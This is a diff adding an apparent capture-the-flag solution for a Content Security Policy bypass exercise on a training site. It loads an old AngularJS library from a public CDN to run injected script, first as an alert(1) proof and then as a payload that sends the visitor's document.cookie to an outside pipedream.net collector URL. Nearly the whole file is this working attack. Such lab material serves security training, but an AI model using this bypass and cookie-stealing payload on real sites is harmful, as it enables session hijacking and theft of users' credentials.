@@ -1,0 +1,10 @@
+<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+SOLUTION:
+<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
+<div ng-app ng-csp>{{$eval.constructor("document.location='https://en0wgerhu58i1m.x.pipedream.net/?' + document.cookie;")()}}</div>
+
+
+
+https://csp.training.jinblack.it/thanks/ec21a1f4dc784ebd8809de401215d3fd #to know how the url is structured
